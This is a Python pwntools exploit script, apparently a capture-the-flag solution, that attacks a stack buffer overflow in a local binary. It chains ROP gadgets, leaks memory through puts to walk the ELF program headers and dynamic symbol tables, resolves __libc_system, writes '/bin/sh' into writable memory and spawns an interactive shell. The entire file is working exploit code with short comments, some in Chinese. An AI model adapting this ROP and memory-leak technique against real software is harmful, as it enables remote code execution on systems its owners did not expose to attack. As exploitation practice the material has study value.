#coding:utf-8
from pwn import *
#from zio import *
import socket, struct, binascii
import telnetlib

elf = ELF('./pwn1003s4de5rf76tg87yhu')

if True:
    #context.log_level = 'debug'
    p = process('./pwn1003s4de5rf76tg87yhu')
else:
    p = remote('127.0.0.1', 12345)

puts_plt = elf.symbols['puts']    #0x4005b0 # <puts@plt>: objdump -d -j.plt pwn | grep puts
read_plt =  elf.symbols['read']     #0x4005e0 # <read@plt>:   objdump -d -j.plt pwn | grep read
log.info('plt.puts: ' + hex(puts_plt))
log.info('plt.read: ' + hex(read_plt))

puts_got = elf.got['puts'] # 0x601020
read_got = elf.got['read'] # 0x601038
log.info('got.puts: ' + hex(puts_got))
log.info('got.read: ' + hex(read_got))

rwdata_addr = 0x601000      # = = attention

overwrite = 'A'*(0x40 + 8)

poprdiret_addr = 0x400763 # ROPgadget --binary welpwn --only "pop|ret" | grep rdi
#   40075a:	5b                   	pop    %rbx
pop5ret_addr = 0x40075a   # __libc_csu_init
movcall_addr = 0x400740     # __libc_csu_init

vulnfunc_addr = 0x400550    # exploit address


def gadget_arg1(func_addr, arg):
    payload = overwrite
    payload += p64(poprdiret_addr)
    payload += p64(arg)
    payload += p64(func_addr)
    payload += p64(vulnfunc_addr)
    return payload

def gadget_call(func_addr, arg1=0, arg2=0, arg3=0, init_ret1=movcall_addr, init_ret2=vulnfunc_addr):
    payload = overwrite
    payload += p64(pop5ret_addr)
    payload += p64(0)   # rbx
    payload += p64(1)   # rbp
    payload += p64(func_addr)
    payload += p64(arg3) + p64(arg2) + p64(arg1)
    payload += p64(init_ret1)    # call 
    payload += '\x00'*(7*0x8)       # pop7
    payload += p64(init_ret2)   # 最后返回到有漏洞的地方下次再次利用
    return payload

def leak(address, n_size):
    count = 0
    buf = ''
    payload = gadget_arg1(puts_plt, address)
    payload += 'D'*(200-len(payload))
    p.send(payload)
    p.recvuntil('bye~\n')
    while count<n_size:
        c = p.recv(1)
        count += 1
        if c == '\n':
            buf += '\x00'
            break
        else:
            buf += c
    leak_data = buf[:n_size]
    if count < n_size:
        leak_data = leak_data + chr(0)*(n_size - len(leak_data))
    return leak_data

def find_elf_base(entry):
    libc_base = entry&0xfffffffffffff000
    while True:
        garbage = leak(libc_base, 0x04)
        if garbage == '\x7fELF':
            break
        libc_base -= 0x1000
    print "libc_base:", hex(libc_base)
    return libc_base

def find_phdr(elf_base):
    phdr = u64(leak(elf_base+0x20, 0x08)) + elf_base
    print "[+]Program headers table:", hex(phdr)
    return phdr

def find_dyn_section(phdr, elf_base):
    phdr_ent = phdr
    while True:
        garbage = u32(leak(phdr_ent, 0x4))
        # p_type of dynamic segment is 0x2
        if garbage == 0x2:
            break
        phdr_ent += 0x38
    dyn_section = u64(leak(phdr_ent + 0x10, 0x8)) + elf_base
    print '[+] .dynamic section headers table:', hex(dyn_section)
    return dyn_section
    
def find_sym_str_table(dyn_section):
    dyn_ent = dyn_section
    dt_sym_tab = 0x0
    dt_str_tab = 0x0
    while True:
        garbage = u64(leak(dyn_ent, 0x8))
        if garbage == 0x6:
            dt_sym_tab = u64(leak(dyn_ent + 0x8, 0x8))
        elif garbage == 0x5:
            dt_str_tab = u64(leak(dyn_ent + 0x8, 0x8))
        if dt_str_tab and dt_sym_tab:
            break
        dyn_ent += 0x10
    print '[+] symtab:', hex(dt_sym_tab)
    print '[+] strtab:', hex(dt_str_tab)
    return (dt_sym_tab, dt_str_tab)
    
def find_func_adr(dt_sym_tab, dt_str_tab, func, elf_base):
    sym_ent = dt_sym_tab
    while True:
        garbage = u32(leak(sym_ent, 0x4))
        name    = leak(dt_str_tab + garbage, len(func))
        if name == func:
            break
        sym_ent += 0x18
    adr_func = u64(leak(sym_ent + 0x8, 0x8)) + elf_base
    print '[+] %s loaded address : 0x%x' % (func, adr_func)
    return adr_func
    
def exp(sys_addr):
    # read(0, rwdata_addr, 0x08) 写入8个字节字符串
    payload = gadget_call(read_got, arg1=0, arg2=rwdata_addr, arg3=0x10)
    payload += 'D'*(200-len(payload))
    p.send(payload)
    log.info('Sending system address and binsh')
    p.send('/bin/sh\x00'+p64(sys_addr))
    p.recvuntil('bye~\n')
    # 检查一下
    leak(rwdata_addr,0x08)
    leak(rwdata_addr+8,0x08)
    # call sys "/bin/sh"
    payload = gadget_call(rwdata_addr+8, arg1=rwdata_addr)
    payload += 'D'*(200-len(payload))
    p.send(payload)
    p.recvuntil('bye~\n')
    p.interactive()

# syscall(SYS_chmod, "/bin/sh", 0444);
def lookup_s(func):
    read_addr = u64(leak(read_got, 0x8))
    print "read_addr:", hex(read_addr)
    elf_base = find_elf_base(read_addr)
    phdr = find_phdr(elf_base)
    dyn_section = find_dyn_section(phdr, elf_base)
    dt_sym_tab, dt_str_tab = find_sym_str_table(dyn_section)
    func_address = find_func_adr(dt_sym_tab, dt_str_tab, func, elf_base)
    return func_address

system_addr = lookup_s('__libc_system')
exp(system_addr)


